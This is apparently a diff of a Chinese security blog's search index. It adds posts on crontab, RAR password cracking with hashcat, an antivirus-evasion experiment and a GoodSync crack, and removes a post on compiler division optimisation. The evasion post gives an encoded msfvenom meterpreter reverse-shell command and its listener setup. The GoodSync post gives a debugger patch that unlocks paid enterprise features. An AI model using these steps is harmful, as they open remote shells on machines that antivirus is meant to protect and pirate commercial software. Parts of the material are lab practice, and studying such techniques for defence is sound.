@@ -1,54 +1,273 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>流水线乱序与除法定式</title>
-    <url>/2021/01/03/%E9%80%86%E5%90%91/%E6%B5%81%E6%B0%B4%E7%BA%BF%E4%B9%B1%E5%BA%8F%E4%B8%8E%E9%99%A4%E6%B3%95%E5%AE%9A%E5%BC%8F/</url>
-    <content><![CDATA[<h2 id="流水线乱序"><a href="#流水线乱序" class="headerlink" title="流水线乱序"></a>流水线乱序</h2><p>为了提升效率，打乱原有的指令顺序，例如：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cdq</span><br><span class="line">lea esi, [ecx + 445]</span><br><span class="line">idiv esi</span><br></pre></td></tr></table></figure>
-<p>本来<code>cdq</code>与<code>idiv</code>相关性更高，但是<code>cdq</code>与<code>idiv</code>都会用到 <code>edx</code>，所以插入与<code>edx</code>无关的<code>lea</code>指令，可以小幅提高效率。</p>
-<h2 id="除法定式"><a href="#除法定式" class="headerlink" title="除法定式"></a>除法定式</h2><p>除法的优化原则，就是将除法指令转为等效的乘法和移位。<br>简化版推导过程如下：<br>设 a 为被除数，c 为除数，q 为商，r 为余数：</p>
-<p>$\cfrac{a}{c} = q … r$</p>
-<p>除以 c 等于乘以 c 的倒数可得：</p>
-<p>${a}*\cfrac{1}{c}$</p>
-<p>c 的倒数，分子分母同时乘以2的n次幂，可得：</p>
-<p>${a}<em>\cfrac{1</em>2^n}{c*2^n}$</p>
-<p>等于</p>
-<p>${a}<em>\cfrac{2^n}{c}</em>\cfrac{1}{2^n}$</p>
-<p>其中$\cfrac{2^n}{c}$是在编译期间就能计算好的，称为 MagicNumber。对于 VC 系列编译器，对 n 的取值都是大于等于32，所以除法最后变成：</p>
-<p>$(a * MagicNumber) &gt;&gt; n$</p>
-<p>x86汇编中的乘法指令<code>imul</code>或者<code>mul</code>，都是用 eax存放低32位数据，edx 存放高32位数据，编译器生成除法指令时可能产生如下指令：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sar edx, K</span><br></pre></td></tr></table></figure>
-<p>相当于乘法结果右移32位后再右移K位，带入到公式中：</p>
-<p>$(a * MagicNumber) &gt;&gt; (32+K)$</p>
-<p>又因为：</p>
-<p>$MagicNumber = \cfrac{2^n}{c}$</p>
-<p>所以，还原除数 c 的公式为：</p>
-<p>$c = \cfrac{2^n}{MagicNumber}$</p>
-<p>最终：<br>$c = \cfrac{2^{32 + K}}{MagicNumber}$</p>
-<p>总结，遇到除法，首先要想到公式</p>
-<p>$c = \cfrac{2^{32 + K}}{MagicNumber}$</p>
-<p>K 会出现在<code>sar edx, K</code>中。下面的各种情况，都是对 MagicNumber 做一些调整，例如检查符号位等等，但是思路是一样的，优先使用这个公式还原。</p>
-<h3 id="除数为正数，且为2的幂"><a href="#除数为正数，且为2的幂" class="headerlink" title="除数为正数，且为2的幂"></a>除数为正数，且为2的幂</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov eax, dword ptr [ebp-4]</span><br><span class="line">cdq</span><br><span class="line">sub eax, edx ;或者 add edx, 7    add eax, edx</span><br><span class="line">sar eax, K</span><br></pre></td></tr></table></figure>
-<p><code>cdq</code>将符号扩展到 edx，<code>sub eax, edx</code>执行的操作是将 eax 减去高位 edx，是为了调整移位取整的问题，被除数为正数，edx 为0，等于没处理；被除数为负数，相当于加1；<code>add edx, 7    add eax, edx</code>这两句同理，目的都为解决被除数的符号问题，最后右移完成除法。<br>所以，最后还原为<code>eax / (2^K)</code>。</p>
-<h3 id="除数为正数，且为非2的幂"><a href="#除数为正数，且为非2的幂" class="headerlink" title="除数为正数，且为非2的幂"></a>除数为正数，且为非2的幂</h3><h4 id="情况1"><a href="#情况1" class="headerlink" title="情况1"></a>情况1</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov eax, MagicNumber</span><br><span class="line">imul A</span><br><span class="line">sar edx, K</span><br><span class="line">mov reg, edx</span><br><span class="line">shr reg, 1Fh</span><br><span class="line">add edx, reg</span><br><span class="line">; 此后直接使用 edx 的值，eax 弃而不用</span><br></pre></td></tr></table></figure>
-<p>还原为<code>edx = A / &#123;  (2^ k+32  /  MagicNumber) &#125;</code>。</p>
-<h4 id="情况2"><a href="#情况2" class="headerlink" title="情况2"></a>情况2</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov eax, MagicNumber (大于0x7FFFFFFFh)</span><br><span class="line">imul A</span><br><span class="line">add edx, reg</span><br><span class="line">sar edx, K</span><br><span class="line">mov reg, edx</span><br><span class="line">shr reg, 1Fh</span><br><span class="line">add edx, reg</span><br><span class="line">; 此后直接使用 edx 的值</span><br></pre></td></tr></table></figure>
-<p>还原为<code>edx = A / &#123;2^(K + 32)  /  MagicNumber &#125;</code></p>
-<h3 id="无符号除数，且为非2的幂"><a href="#无符号除数，且为非2的幂" class="headerlink" title="无符号除数，且为非2的幂"></a>无符号除数，且为非2的幂</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov eax, MagicNumber</span><br><span class="line">mul A</span><br><span class="line">sub reg, edx</span><br><span class="line">shr reg, 1</span><br><span class="line">add reg, edx</span><br><span class="line">shr reg, K ;这句可能没有，如果没有，则 K 值为0，如果有就是 K + 1</span><br><span class="line">; 此后直接使用 reg 的值，eax 弃而不用</span><br></pre></td></tr></table></figure>
-<p>还原为<code>reg = (unsigned)A / &#123; (2^(k + 1 +32)  /  (2^32 + MagicNumber) &#125;</code>。</p>
-<h3 id="除数为负数，且为2的幂"><a href="#除数为负数，且为2的幂" class="headerlink" title="除数为负数，且为2的幂"></a>除数为负数，且为2的幂</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov eax, dword ptr [ebp-4]</span><br><span class="line">cdq</span><br><span class="line">sub eax, edx ;或者 add edx, 7    add eax, edx</span><br><span class="line">sar eax, K</span><br><span class="line">neg eax</span><br></pre></td></tr></table></figure>
-<p>还原为<code>eax / &#123; -(2^K) &#125;</code>，参考“除数为正数，且为2的幂”的情况，将结果<code>neg</code>取反，表示除数为负。</p>
-<h3 id="除数为负数，且为非2的幂"><a href="#除数为负数，且为非2的幂" class="headerlink" title="除数为负数，且为非2的幂"></a>除数为负数，且为非2的幂</h3><p>两种情况，但是还原方式是一样的。</p>
-<h4 id="情况1-1"><a href="#情况1-1" class="headerlink" title="情况1"></a>情况1</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov eax, MagicNumber (大于0x7FFFFFFFh)</span><br><span class="line">imul A</span><br><span class="line">sar edx, K</span><br><span class="line">mov reg, edx</span><br><span class="line">shr reg, 1Fh</span><br><span class="line">add edx, reg</span><br><span class="line">; 此后直接使用 edx 的值</span><br></pre></td></tr></table></figure>
-<p>还原为<code>edx = A / &#123; - (2^(k+32)  /  (2^32 - MagicNumber) ) &#125;</code>。</p>
-<h4 id="情况2-1"><a href="#情况2-1" class="headerlink" title="情况2"></a>情况2</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov eax, MagicNumber (小于0x7FFFFFFFh)</span><br><span class="line">imul A</span><br><span class="line">sub edx, reg</span><br><span class="line">sar, edx, K</span><br><span class="line">mov reg, edx</span><br><span class="line">shr reg, 1Fh</span><br><span class="line">add edx, reg</span><br><span class="line">; 此后直接使用 edx 的值</span><br></pre></td></tr></table></figure>
-<p>还原为<code>edx = A / &#123; - (2^(k+32)  /  (2^32 - MagicNumber) ) &#125;</code>。</p>
+    <title>crontab中引入环境变量</title>
+    <url>/2021/01/03/%E5%BC%80%E5%8F%91/crontab%E4%B8%AD%E5%BC%95%E5%85%A5%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/</url>
+    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>crontab 中默认使用的环境变量有限，导致定时任务中执行的脚本，会找不到命令。在执行的脚本中导入当前用户的环境变量可以解决问题。</p>
+<h2 id="添加方式"><a href="#添加方式" class="headerlink" title="添加方式"></a>添加方式</h2><p>脚本中添加环境变量的方式如下：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">. /etc/profile</span><br><span class="line">~/.bash_profile</span><br></pre></td></tr></table></figure>
+<p>我这里使用了第一种。<br>crontab 中默认使用的环境变量如下：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/bin:/bin</span><br></pre></td></tr></table></figure>
+<p>脚本中添加用户环境变量后，变为：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br></pre></td></tr></table></figure>
+<h2 id="2-gt-amp-1使用"><a href="#2-gt-amp-1使用" class="headerlink" title="2&gt;&amp;1使用"></a><code>2&gt;&amp;1</code>使用</h2><p>排查问题的过程中使用了<code>2&gt;&amp;1</code>，很关键。问题现象是，<code>route &gt; log.txt</code>手动执行后，文件有内容，放到定时任务中只生成文件但是没有内容。<br>直到加入了<code>2&gt;&amp;1</code>才看到错误信息：找不到<code>route</code>命令，进而想到是环境变量的问题。这部分内容转自 <a href="https://www.cnblogs.com/yangyongzhi/p/3364939.html">https://www.cnblogs.com/yangyongzhi/p/3364939.html</a></p>
+<h3 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h3><ol>
+<li>默认地，标准的输入为键盘，但是也可以来自文件或管道（pipe |）。</li>
+<li>默认地，标准的输出为终端（terminal)，但是也可以重定向到文件，管道或后引号（backquotes `）。</li>
+<li>默认地，标准的错误输出到终端，但是也可以重定向到文件。</li>
+<li>标准的输入，输出和错误输出分别表示为<code>STDIN</code>，<code>STDOUT</code>，<code>STDERR</code>，也可以用0，1，2来表示。</li>
+<li>其实除了以上常用的3中文件描述符，还有3~9也可以作为文件描述符。3~9你可以认为是执行某个地方的文件描述符，常被用来作为临时的中间描述符。</li>
+<li>实例：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">command</span> 2&gt;errfile <span class="comment"># command的错误重定向到文件errfile。</span></span><br><span class="line"><span class="built_in">command</span> 2&gt;&amp;1 | ... <span class="comment">#  command的错误重定向到标准输出，错误和标准输出都通过管道传给下个命令。</span></span><br><span class="line">var=`<span class="built_in">command</span> 2&gt;&amp;1` <span class="comment">#  command的错误重定向到标准输出，错误和标准输出都赋值给var。</span></span><br><span class="line"><span class="built_in">command</span> 3&gt;&amp;2 2&gt;&amp;1 1&gt;&amp;3 | ... <span class="comment"># 实现标准输出和错误输出的交换。</span></span><br><span class="line">var=`<span class="built_in">command</span> 3&gt;&amp;2 2&gt;&amp;1 1&gt;&amp;3` <span class="comment"># 实现标准输出和错误输出的交换。</span></span><br><span class="line"><span class="built_in">command</span> 2&gt;&amp;1 1&gt;&amp;2 | ...     (wrong...)  <span class="comment"># 这个不能实现标准输出和错误输出的交换。因为shell从左到右执行命令，当执行完2&gt;&amp;1后，错误输出已经和标准输出一样的，再执行 1&gt;&amp;2也没有意义。</span></span><br></pre></td></tr></table></figure>
+<h3 id="“2-gt-amp-1-file”和-“-gt-file-2-gt-amp-1”区别"><a href="#“2-gt-amp-1-file”和-“-gt-file-2-gt-amp-1”区别" class="headerlink" title="“2&gt;&amp;1 file”和 “&gt; file 2&gt;&amp;1”区别"></a>“2&gt;&amp;1 file”和 “&gt; file 2&gt;&amp;1”区别</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat food 2&gt;&amp;1 &gt;file <span class="comment">#错误输出到终端，标准输出被重定向到文件file。</span></span><br><span class="line">2）cat food &gt;file 2&gt;&amp;1 <span class="comment">#标准输出被重定向到文件 file，然后错误输出也重定向到和标准输出一样，所以也错误输出到文件file。</span></span><br></pre></td></tr></table></figure>
+<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>通常打开的文件在进程推出的时候自动的关闭，但是更好的办法是当你使用完以后立即关闭。用<code>m&lt;&amp;-</code>来关闭输入文件描述符<code>m</code>，用<code>m&gt;&amp;-</code>来关闭输出文件描述符<code>m</code>。如果你需要关闭标准输入用<code>&lt;&amp;-</code>， <code>&gt;&amp;-</code>被用来关闭标准输出。</p>
+<h3 id="同时输出到终端和文件"><a href="#同时输出到终端和文件" class="headerlink" title="同时输出到终端和文件"></a>同时输出到终端和文件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">copy <span class="built_in">source</span> dest | tee.exe copyerror.txt</span><br></pre></td></tr></table></figure>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ol>
+<li><a href="http://docstore.mik.ua/orelly/unix/upt/ch45_21.htm">http://docstore.mik.ua/orelly/unix/upt/ch45_21.htm</a></li>
+<li><a href="http://www.unix.com/shell-programming-scripting/34011-meaning-dev-null-2-1-a.html">http://www.unix.com/shell-programming-scripting/34011-meaning-dev-null-2-1-a.html</a></li>
+<li><a href="http://docstore.mik.ua/orelly/unix/upt/ch08_13.htm">http://docstore.mik.ua/orelly/unix/upt/ch08_13.htm</a></li>
+</ol>
+<h2 id="附"><a href="#附" class="headerlink" title="附"></a>附</h2><p>脚本内容如下：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">. /etc/profile</span><br><span class="line">DATE=$(date <span class="string">&quot;+%F %X&quot;</span>)</span><br><span class="line">gateway=<span class="string">&quot;192.168.0.1&quot;</span></span><br><span class="line"><span class="built_in">log</span>=<span class="string">&quot;/home/root/chkroute.log&quot;</span></span><br><span class="line">txt=<span class="string">&quot;/home/root/route.txt&quot;</span></span><br><span class="line">route &gt; <span class="variable">$txt</span> 2&gt;&amp;1</span><br><span class="line"></span><br><span class="line">awk -v varDATE=<span class="string">&quot;<span class="variable">$DATE</span>&quot;</span> -v vargateway=<span class="string">&quot;<span class="variable">$gateway</span>&quot;</span> -v varlog=<span class="string">&quot;<span class="variable">$log</span>&quot;</span> -v vartxt=<span class="string">&quot;<span class="variable">$txt</span>&quot;</span> <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">    if($1 == &quot;default&quot;)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        if($2 != vargateway)</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            printf(&quot;[%s]gateway %s is error, now del and add %s!\n&quot;,  varDATE, $2, vargateway) &gt;&gt; varlog</span></span><br><span class="line"><span class="string">            cmd=&quot;route del default gw &quot;$2</span></span><br><span class="line"><span class="string">            system(cmd);</span></span><br><span class="line"><span class="string">            system(&quot;sleep 1&quot;)</span></span><br><span class="line"><span class="string">            cmd=&quot;route add default gw &quot;vargateway</span></span><br><span class="line"><span class="string">            system(cmd);</span></span><br><span class="line"><span class="string">        &#125;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span> <span class="string">&quot;<span class="variable">$txt</span>&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>开发</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>用 rar2john+hashcat 破解 RAR 文件密码</title>
+    <url>/2021/01/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%94%A8%20rar2john+hashcat%20%E7%A0%B4%E8%A7%A3%20RAR%20%E6%96%87%E4%BB%B6%E5%AF%86%E7%A0%81/</url>
+    <content><![CDATA[<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><p>rar2john 工具下载地址：<br><a href="http://openwall.info/wiki/_media/john/johntheripper-v1.8.0.12-jumbo-1-bleeding-e6214ceab-2018-02-07-win-x64.7z">http://openwall.info/wiki/_media/john/johntheripper-v1.8.0.12-jumbo-1-bleeding-e6214ceab-2018-02-07-win-x64.7z</a></p>
+<p>hashcat 下载地址：<br><a href="https://hashcat.net/files/hashcat-4.1.0.7z">https://hashcat.net/files/hashcat-4.1.0.7z</a></p>
+<p>下载并解压这两个工具，放到同级目录，方便以后使用，目录结构如下所示：<br>D:Tool<br>├─hashcat<br>│  ├─MyCrackRAR.bat<br>│ ├─testfile.rar<br>├─JohnTheRipper</p>
+<h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><p>testfile.rar 是测试用的文件，密码为1234。示例中的 hash 值仅演示用，并非真正的 hash。<br>1. 用 rar2john.exe 获取 rar 压缩文件的 hash 值：</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">D:\<span class="title">Tool</span>\<span class="title">JohnTheRipper</span>\<span class="title">run</span>&gt;<span class="title">rar2john.exe</span> <span class="title">testfile.rar</span></span></span><br><span class="line"><span class="function"><span class="title">testfile.rar</span>:$<span class="title">RAR3</span>$*0*5<span class="title">ba3dd697a8706fa</span>*919<span class="title">ad1d7a1c42bae4a8d462c8537c9cb</span>:0::::<span class="title">testfile.rar</span></span></span><br></pre></td></tr></table></figure>
+<p>2. 用 hashcat 破解：</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">hashcat64.exe -m <span class="number">12500</span> -a3 $RAR3$*<span class="number">0</span>*<span class="number">5</span>ba3dd697a8706fa*<span class="number">919</span>ad1d7a1c42bae4a8d462c8537c9cb ?d?d?d?d</span><br></pre></td></tr></table></figure>
+<p>3. 方便起见，写一个 MyCrackRAR.bat 脚本，放在 hashcat 目录中，内容如下：</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="comment">rem szRarFile rar文件名</span></span><br><span class="line"><span class="built_in">set</span> szRarFile=&quot;testfile.rar&quot;</span><br><span class="line"><span class="built_in">echo</span> RAR文件:[<span class="variable">%szRarFile%</span>]</span><br><span class="line"><span class="comment">rem for 循环作用为截取两个冒号中的内容</span></span><br><span class="line"><span class="keyword">for</span> /f  &quot;delims=:, tokens=<span class="number">2</span>&quot; <span class="variable">%%i</span> <span class="keyword">in</span> (&#x27;..\JohnTheRipper\run\rar2john.exe <span class="variable">%szRarFile%</span>&#x27;)  <span class="keyword">do</span> (</span><br><span class="line">     <span class="built_in">set</span> szHash=&quot;<span class="variable">%%i</span>&quot;</span><br><span class="line">)</span><br><span class="line"><span class="comment">rem 去掉字符串的前后双引号</span></span><br><span class="line"><span class="built_in">set</span> szHash=<span class="variable">%szHash:~1,-1%</span></span><br><span class="line"><span class="built_in">echo</span> RAR文件hash值为[<span class="variable">%szHash%</span>]</span><br><span class="line">@<span class="built_in">echo</span> on</span><br><span class="line">hashcat64.exe -m <span class="number">12500</span> -a3 <span class="variable">%szHash%</span> ?d?d?d?d</span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>
+<h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><p>hashcat 支持 RAR3-hp 和 RAR5，官方示例如下：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>-m 参数</th>
+<th>类型</th>
+<th>示例 hash</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>12500</td>
+<td>RAR3-hp</td>
+<td><code>$RAR3$*0*45109af8ab5f297a*adbf6c5385d7a40373e8f77d7b89d317</code></td>
+</tr>
+<tr>
+<td>13000</td>
+<td>RAR5</td>
+<td><code>$rar5$16$74575567518807622265582327032280$15$f8b4064de34ac02ecabfe9abdf93ed6a$8$9843834ed0f7c754</code></td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>注意 hash 中，RAR3-hp 值为<code>$RAR3$*0*xxx</code>，中间的数值是0（<code>-hp</code>）而不是1（<code>-p</code>），<code>-p</code>尚未得到支持，只支持<code>-hp</code>。</p>
+<p>本例中使用的就是 RAR3-hp，因为没有新版 WinRAR 所以没测试 RAR5 类型。</p>
+<p>关于 RAR 参数<code>-p</code>和<code>-hp</code>的区别<br><code>-p</code>：只对 RAR 文件加密，里面的目录和文件名没加密；<br><code>-hp</code>：对目录中的文件名和子目录都进行加密处理。</p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>hashcat</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>payload分离免杀实验</title>
+    <url>/2021/01/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/payload%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C/</url>
+    <content><![CDATA[<p>原文链接：<a href="https://micro8.gitbook.io/micro8/contents-1/41-50/47payload-fen-li-mian-sha-si-lu">https://micro8.gitbook.io/micro8/contents-1/41-50/47payload-fen-li-mian-sha-si-lu</a></p>
+<h2 id="生成shellcode"><a href="#生成shellcode" class="headerlink" title="生成shellcode"></a>生成shellcode</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.78.1 lport=8888 -e x86/shikata_ga_nai -i 5 -f raw &gt; test.bin</span><br></pre></td></tr></table></figure>
+<h2 id="msf监听端口"><a href="#msf监听端口" class="headerlink" title="msf监听端口"></a>msf监听端口</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; set playload windows/meterpreter/reverse_tcp</span><br><span class="line">playload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lport 8888</span><br><span class="line">lport =&gt; 8888</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lhost 0.0.0.0</span><br><span class="line">lhost =&gt; 0.0.0.0</span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit</span><br></pre></td></tr></table></figure>
+<h2 id="测试效果"><a href="#测试效果" class="headerlink" title="测试效果"></a>测试效果</h2><p>1. 下载 github 上的shellcode加载器，把加载器和shellcode用WinRar打包成自解压文件；<br>2. 在 WinXP 虚拟机中运行；<br>3. 在开启360的情况下，正常运行，效果如下：<br><img src="/2021/01/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/payload%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C/67868500.png" alt="67868500.png"><br><img src="/2021/01/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/payload%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C/67916687.png" alt="67916687.png"></p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>免杀</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>GoodSync破解</title>
+    <url>/2021/01/03/%E9%80%86%E5%90%91/GoodSync%E7%A0%B4%E8%A7%A3/</url>
+    <content><![CDATA[<h1 id="GoodSync-简介"><a href="#GoodSync-简介" class="headerlink" title="GoodSync 简介"></a>GoodSync 简介</h1><p>GoodSync 是一个很好用的文件同步工具，可以同步本地的目录，也可以将数据同步到另外一台计算机。免费版可以使用完整功能，有30天的限制，30天后同步任务不能超过3个，同步文件数量不能超过100。</p>
+<h1 id="破解思路"><a href="#破解思路" class="headerlink" title="破解思路"></a>破解思路</h1><p>破解过程，主要参考了帖子：<a href="https://www.52pojie.cn/thread-533013-1-1.html">https://www.52pojie.cn/thread-533013-1-1.html</a></p>
+<p>先说下大概思路，收费版本有个标志，是0x4000，满足该标志时跳转到企业版（ENTERPRISE）的功能。原帖中，是将跳转前给标志赋值，我这里改动后，有时好使，有时候不好使，具体原因不明，可能是版本更新加入了新的检查，所以稍加改动，找到写入该标志的变量位置，这里赋值为0x4000，功能都正常了，暂时没发现问题。</p>
+<h1 id="详细过程"><a href="#详细过程" class="headerlink" title="详细过程"></a>详细过程</h1><p>因为我这里安装的是64位的版本，所以要用x64dbg调试。断在程序入口后，搜索关键字“ENTERPRISE”：</p>
+<p><img src="/2021/01/03/%E9%80%86%E5%90%91/GoodSync%E7%A0%B4%E8%A7%A3/5f6088e8-66a6-41f0-b1cd-3caa19441f4f.png" alt="5f6088e8-66a6-41f0-b1cd-3caa19441f4f.png"></p>
+<p>然后找到<code>[rax + 4]</code>的位置，下硬件写入断点，然后重新运行：</p>
+<p><img src="/2021/01/03/%E9%80%86%E5%90%91/GoodSync%E7%A0%B4%E8%A7%A3/19bcff80-73d7-4d06-8fa6-7d6a6cdba268.png" alt="19bcff80-73d7-4d06-8fa6-7d6a6cdba268.png"></p>
+<p>这里会来两次，应该是用于初始化变量，再F9：</p>
+<p><img src="/2021/01/03/%E9%80%86%E5%90%91/GoodSync%E7%A0%B4%E8%A7%A3/c3c7c101-dbb5-4026-8d45-8cb3fdcc30ee.png" alt="c3c7c101-dbb5-4026-8d45-8cb3fdcc30ee.png"></p>
+<p>这里将<code>ecx</code>传给<code>[rax + 4]</code>，此时将<code>ecx</code>赋值为0x4000，再进行后续的判断，就变为企业版了，先将</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov dword ptr ds:[rax+4],ecx </span><br></pre></td></tr></table></figure>
+<p>改为跳转到一块空白的地址：</p>
+<p><img src="/2021/01/03/%E9%80%86%E5%90%91/GoodSync%E7%A0%B4%E8%A7%A3/a1055c77-8bf7-4ada-8210-a386e2c8b82d.png" alt="a1055c77-8bf7-4ada-8210-a386e2c8b82d.png"></p>
+<p>再将新地址写入汇编</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov ecx,4000 </span><br><span class="line">mov dword ptr ds:[rax+4],ecx </span><br><span class="line">jmp goodsync-v10.140523429</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/01/03/%E9%80%86%E5%90%91/GoodSync%E7%A0%B4%E8%A7%A3/0dfd3759-bd52-4d38-bcff-96557dfa78fe.png" alt="0dfd3759-bd52-4d38-bcff-96557dfa78fe.png"></p>
+<p>这样就完成了破解。</p>
+<h1 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h1><p>原帖给程序打补丁时，为了保存寄存器环境，用到的<code>pushad</code>和<code>popad</code>指令，x64中不支持这两条指令，如果有需要，只能手动挨个保存寄存器。<br>详见 Intel 手册《64-ia-32-architectures-software-developer-manual-325462》— “PUSHA/PUSHAD—Push All General-Purpose Registers”章节：<br><img src="/2021/01/03/%E9%80%86%E5%90%91/GoodSync%E7%A0%B4%E8%A7%A3/816b86f1-0a13-4dad-bd13-08972698797f.png" alt="816b86f1-0a13-4dad-bd13-08972698797f.png"></p>
 ]]></content>
       <categories>
         <category>逆向</category>
       </categories>
       <tags>
-        <tag>除法</tag>
+        <tag>GoodSync</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>Win7x64虚拟机</title>
+    <url>/2021/01/03/%E9%80%86%E5%90%91/Win7x64%E8%99%9A%E6%8B%9F%E6%9C%BA/</url>
+    <content><![CDATA[<p>为了方便调试样本，搞了一个Win7x64的虚拟机：<br><img src="/2021/01/03/%E9%80%86%E5%90%91/Win7x64%E8%99%9A%E6%8B%9F%E6%9C%BA/c915be9c-2f6b-420e-9c9e-f0c932a7fa5b.jpg" alt="c915be9c-2f6b-420e-9c9e-f0c932a7fa5b.jpg"><br>集成了一部分工具，大致如下：<br><img src="/2021/01/03/%E9%80%86%E5%90%91/Win7x64%E8%99%9A%E6%8B%9F%E6%9C%BA/6ccc5cff-f454-4c51-b77d-d5b8b76a4311.png" alt="6ccc5cff-f454-4c51-b77d-d5b8b76a4311.png"><br>虚拟机配置：<br><img src="/2021/01/03/%E9%80%86%E5%90%91/Win7x64%E8%99%9A%E6%8B%9F%E6%9C%BA/38bfab90-435f-4b65-b1fa-673f37896e9c.png" alt="38bfab90-435f-4b65-b1fa-673f37896e9c.png"></p>
+<p>虚拟机大小在15G左右，下载后把ovf导入虚拟机就能用了；<br>常用工具单独打包了一份，1.9G左右，送给有缘人。</p>
+<p>下载地址：<br>链接:<br><a href="https://pan.baidu.com/s/1MQmUaDnPq6Hz672M_XkRLw">https://pan.baidu.com/s/1MQmUaDnPq6Hz672M_XkRLw</a></p>
+<p>提取码: de8u</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>文件名</th>
+<th>MD5</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Win7x64模板ovf.z01</td>
+<td>1933A48B9AE7CADA94D48BDB8AB98B96</td>
+</tr>
+<tr>
+<td>Win7x64模板ovf.zip</td>
+<td>A02E16219FE90F88DB414E101EDD45DF</td>
+</tr>
+<tr>
+<td>Win7x64组件和工具.zip</td>
+<td>06CDE3245F6199BCE14CFB122F2CAC42</td>
+</tr>
+</tbody>
+</table>
+</div>
+]]></content>
+      <categories>
+        <category>逆向</category>
+      </categories>
+      <tags>
+        <tag>虚拟机</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>markdown示例_简单到复杂</title>
+    <url>/2021/01/03/%E9%9A%8F%E7%AC%94/markdown%E7%A4%BA%E4%BE%8B_%E7%AE%80%E5%8D%95%E5%88%B0%E5%A4%8D%E6%9D%82/</url>
+    <content><![CDATA[<h1 id="简单的"><a href="#简单的" class="headerlink" title="简单的"></a>简单的</h1><h1 id="标题1"><a href="#标题1" class="headerlink" title="标题1"></a>标题1</h1><h2 id="标题2"><a href="#标题2" class="headerlink" title="标题2"></a>标题2</h2><h3 id="标题3"><a href="#标题3" class="headerlink" title="标题3"></a>标题3</h3><ul>
+<li>列表1<br>测试</li>
+<li>列表2</li>
+<li>列表3</li>
+</ul>
+<p>水平线</p>
+<hr>
+<ol>
+<li>列表1</li>
+<li>列表2</li>
+<li>列表3</li>
+<li>顺序错了不用担心</li>
+<li>写错的列表，会自动纠正</li>
+</ol>
